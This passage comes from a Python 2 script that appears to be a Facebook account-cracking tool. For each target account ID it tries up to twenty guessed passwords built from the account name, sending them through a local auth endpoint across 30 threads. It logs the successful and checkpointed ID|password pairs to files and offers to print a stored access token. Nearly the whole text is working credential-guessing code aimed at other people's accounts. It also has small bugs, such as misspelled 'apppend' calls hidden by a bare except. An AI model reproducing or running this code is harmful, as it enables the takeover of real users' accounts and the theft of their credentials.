                print '\x1b[1;92m[ZoYa-OK] ' + uid + ' | ' + pass1

                ok = open('/sdcard/ids/ZoYa_OK.txt', 'a')

                ok.write(uid + ' | ' + pass1 + '\n')

                ok.close()

                oks.append(uid + pass1)

            elif 'www.facebook.com' in q['error']:

                print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass1

                cp = open('ZoYa_CP.txt', 'a')

                cp.write(uid + ' | ' + pass1 + '\n')

                cp.close()

                cps.append(uid + pass1)

            else:

                pass2 = name.lower() + p2

                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text

                q = json.loads(data)

                if 'loc' in q:

                    print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass2

                    ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                    ok.write(uid + ' | ' + pass2 + '\n')

                    ok.close()

                    oks.append(uid + pass2)

                elif 'www.facebook.com' in q['error']:

                    print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass2

                    cp = open('ZoYa_CP.txt', 'a')

                    cp.write(uid + ' | ' + pass2 + '\n')

                    cp.close()

                    cps.append(uid + pass2)

                else:

                    pass3 = name.lower() + p3

                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text

                    q = json.loads(data)

                    if 'loc' in q:

                        print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass3

                        ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                        ok.write(uid + ' | ' + pass3 + '\n')

                        ok.close()

                        oks.append(uid + pass3)

                    elif 'www.facebook.com' in q['error']:

                        print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass3

                        cp = open('ZoYa_CP.txt', 'a')

                        cp.write(uid + ' | ' + pass3 + '\n')

                        cp.close()

                        cps.append(uid + pass3)

                    else:

                        pass4 = name.lower() + p4

                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text

                        q = json.loads(data)

                        if 'loc' in q:

                            print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass4

                            ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                            ok.write(uid + ' | ' + pass4 + '\n')

                            ok.close()

                            oks.append(uid + pass4)

                        elif 'www.facebook.com' in q['error']:

                            print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass4

                            cp = open('ZoYa_CP.txt', 'a')

                            cp.write(uid + ' | ' + pass4 + '\n')

                            cp.close()

                            cps.append(uid + pass4)

                        else:

                            pass5 = name.lower() + p5

                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text

                            q = json.loads(data)

                            if 'loc' in q:

                                print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass5

                                ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                ok.write(uid + ' | ' + pass5 + '\n')

                                ok.close()

                                oks.append(uid + pass5)

                            elif 'www.facebook.com' in q['error']:

                                print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass5

                                cp = open('ZoYa_CP.txt', 'a')

                                cp.write(uid + ' | ' + pass5 + '\n')

                                cp.close()

                                cps.append(uid + pass5)

                            else:

                                pass6 = name.lower() + p6

                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text

                                q = json.loads(data)

                                if 'loc' in q:

                                    print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass6

                                    ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                    ok.write(uid + ' | ' + pass6 + '\n')

                                    ok.close()

                                    oks.append(uid + pass6)

                                elif 'www.facebook.com' in q['error']:

                                    print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass6

                                    cp = open('ZoYa_CP.txt', 'a')

                                    cp.write(uid + ' | ' + pass6 + '\n')

                                    cp.close()

                                    cps.append(uid + pass6)

                                else:

                                    pass7 = name.lower() + p7

                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text

                                    q = json.loads(data)

                                    if 'loc' in q:

                                        print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass7

                                        ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                        ok.write(uid + ' | ' + pass7 + '\n')

                                        ok.close()

                                        oks.append(uid + pass7)

                                    elif 'www.facebook.com' in q['error']:

                                        print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass7

                                        cp = open('ZoYa_CP.txt', 'a')

                                        cp.write(uid + ' | ' + pass7 + '\n')

                                        cp.close()

                                        cps.apppend(uid + pass7)

                                    else:

                                        pass8 = name.lower() + p8

                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text

                                        q = json.loads(data)

                                        if 'loc' in q:

                                            print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass8

                                            ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                            ok.write(uid + ' | ' + pass8 + '\n')

                                            ok.close()

                                            oks.append(uid + pass8)

                                        elif 'www.facebook.com' in q['error']:

                                            print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass8

                                            cp = open('ZoYa_CP.txt', 'a')

                                            cp.write(uid + ' | ' + pass8 + '\n')

                                            cp.close()

                                            cps.apppend(uid + pass8)

                                        else:

                                            pass9 = name.lower() + p9

                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text

                                            q = json.loads(data)

                                            if 'loc' in q:

                                                print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass9

                                                ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                                ok.write(uid + ' | ' + pass9 + '\n')

                                                ok.close()

                                                oks.append(uid + pass9)

                                            elif 'www.facebook.com' in q['error']:

                                                print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass9

                                                cp = open('ZoYa_CP.txt', 'a')

                                                cp.write(uid + ' | ' + pass9 + '\n')

                                                cp.close()

                                                cps.apppend(uid + pass9)

                                            else:

                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text

                                                q = json.loads(data)

                                                if 'loc' in q:

                                                    print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass10

                                                    ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                                    ok.write(uid + ' | ' + pass10 + '\n')

                                                    ok.close()

                                                    oks.append(uid + pass10)

                                                elif 'www.facebook.com' in q['error']:

                                                    print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass10

                                                    cp = open('ZoYa_CP.txt', 'a')

                                                    cp.write(uid + ' | ' + pass10 + '\n')

                                                    cp.close()

                                                    cps.apppend(uid + pass10)

                                                else:

                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass11, headers=header).text

                                                    q = json.loads(data)

                                                    if 'loc' in q:

                                                        print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass11

                                                        ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                                        ok.write(uid + ' | ' + pass11 + '\n')

                                                        ok.close()

                                                        oks.append(uid + pass11)

                                                    elif 'www.facebook.com' in q['error']:

                                                        print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass11

                                                        cp = open('ZoYa_CP.txt', 'a')

                                                        cp.write(uid + ' | ' + pass11 + '\n')

                                                        cp.close()

                                                        cps.apppend(uid + pass11)

                                                    else:

                                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass12, headers=header).text

                                                        q = json.loads(data)

                                                        if 'loc' in q:

                                                            print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass12

                                                            ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                                            ok.write(uid + ' | ' + pass12 + '\n')

                                                            ok.close()

                                                            oks.append(uid + pass12)

                                                        elif 'www.facebook.com' in q['error']:

                                                            print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass12

                                                            cp = open('ZoYa_CP.txt', 'a')

                                                            cp.write(uid + ' | ' + pass12 + '\n')

                                                            cp.close()

                                                            cps.apppend(uid + pass12)

                                                        else:

                                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass13, headers=header).text

                                                            q = json.loads(data)

                                                            if 'loc' in q:

                                                                print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass13

                                                                ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                                                ok.write(uid + ' | ' + pass13 + '\n')

                                                                ok.close()

                                                                oks.append(uid + pass13)

                                                            elif 'www.facebook.com' in q['error']:

                                                                print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass13

                                                                cp = open('ZoYa_CP.txt', 'a')

                                                                cp.write(uid + ' | ' + pass13 + '\n')

                                                                cp.close()

                                                                cps.apppend(uid + pass13)

                                                            else:

                                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass14, headers=header).text

                                                                q = json.loads(data)

                                                                if 'loc' in q:

                                                                    print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass14

                                                                    ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                                                    ok.write(uid + ' | ' + pass14 + '\n')

                                                                    ok.close()

                                                                    oks.append(uid + pass14)

                                                                elif 'www.facebook.com' in q['error']:

                                                                    print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass14

                                                                    cp = open('ZoYa_CP.txt', 'a')

                                                                    cp.write(uid + ' | ' + pass14 + '\n')

                                                                    cp.close()

                                                                    cps.apppend(uid + pass14)

                                                                else:

                                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass15, headers=header).text

                                                                    q = json.loads(data)

                                                                    if 'loc' in q:

                                                                        print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass15

                                                                        ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                                                        ok.write(uid + ' | ' + pass15 + '\n')

                                                                        ok.close()

                                                                        oks.append(uid + pass15)

                                                                    elif 'www.facebook.com' in q['error']:

                                                                        print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass15

                                                                        cp = open('ZoYa_CP.txt', 'a')

                                                                        cp.write(uid + ' | ' + pass15 + '\n')

                                                                        cp.close()

                                                                        cps.apppend(uid + pass15)

                                                                    else:

                                                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass16, headers=header).text

                                                                        q = json.loads(data)

                                                                        if 'loc' in q:

                                                                            print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass16

                                                                            ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                                                            ok.write(uid + ' | ' + pass16 + '\n')

                                                                            ok.close()

                                                                            oks.append(uid + pass16)

                                                                        elif 'www.facebook.com' in q['error']:

                                                                            print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass16

                                                                            cp = open('ZoYa_CP.txt', 'a')

                                                                            cp.write(uid + ' | ' + pass16 + '\n')

                                                                            cp.close()

                                                                            cps.apppend(uid + pass16)

                                                                        else:

                                                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass17, headers=header).text

                                                                            q = json.loads(data)

                                                                            if 'loc' in q:

                                                                                print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass17

                                                                                ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                                                                ok.write(uid + ' | ' + pass17 + '\n')

                                                                                ok.close()

                                                                                oks.append(uid + pass17)

                                                                            elif 'www.facebook.com' in q['error']:

                                                                                print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass17

                                                                                cp = open('ZoYa_CP.txt', 'a')

                                                                                cp.write(uid + ' | ' + pass17 + '\n')

                                                                                cp.close()

                                                                                cps.apppend(uid + pass17)

                                                                            else:

                                                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass18, headers=header).text

                                                                                q = json.loads(data)

                                                                                if 'loc' in q:

                                                                                    print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass18

                                                                                    ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                                                                    ok.write(uid + ' | ' + pass18 + '\n')

                                                                                    ok.close()

                                                                                    oks.append(uid + pass18)

                                                                                elif 'www.facebook.com' in q['error']:

                                                                                    print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass18

                                                                                    cp = open('ZoYa_CP.txt', 'a')

                                                                                    cp.write(uid + ' | ' + pass18 + '\n')

                                                                                    cp.close()

                                                                                    cps.apppend(uid + pass18)

                                                                                else:

                                                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass19, headers=header).text

                                                                                    q = json.loads(data)

                                                                                    if 'loc' in q:

                                                                                        print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass19

                                                                                        ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                                                                        ok.write(uid + ' | ' + pass19 + '\n')

                                                                                        ok.close()

                                                                                        oks.append(uid + pass19)

                                                                                    elif 'www.facebook.com' in q['error']:

                                                                                        print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass19

                                                                                        cp = open('ZoYa_CP.txt', 'a')

                                                                                        cp.write(uid + ' | ' + pass19 + '\n')

                                                                                        cp.close()

                                                                                        cps.apppend(uid + pass19)

                                                                                    else:

                                                                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass20, headers=header).text

                                                                                        q = json.loads(data)

                                                                                        if 'loc' in q:

                                                                                            print '\x1b[1;92m[ZoYa-oK] ' + uid + ' | ' + pass20

                                                                                            ok = open('/sdcard/ids/ZoYa_oK.txt', 'a')

                                                                                            ok.write(uid + ' | ' + pass20 + '\n')

                                                                                            ok.close()

                                                                                            oks.append(uid + pass20)

                                                                                        elif 'www.facebook.com' in q['error']:

                                                                                            print '\x1b[1;93m[ZoYa-CP] ' + uid + ' | ' + pass20

                                                                                            cp = open('ZoYa_CP.txt', 'a')

                                                                                            cp.write(uid + ' | ' + pass20 + '\n')

                                                                                            cp.close()

                                                                                            cps.apppend(uid + pass20)

        except:

            pass

    p = ThreadPool(30)

    p.map(main, id)

    print ''

    print 47 * '-'

    print ''

    print ' \x1b[1;92mCrack Done'

    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))

    print ''

    print 47 * '-'

    print ''

    raw_input(' \x1b[0;96mPress enter to back')

    menu_s()

def v_tok():

    os.system('clear')

    print ''

    os.system('cat access_token.txt')

    print ''

    raw_input(' Press enter to main menu ')

    menu()

if __name__ == '__main__':

    reg()
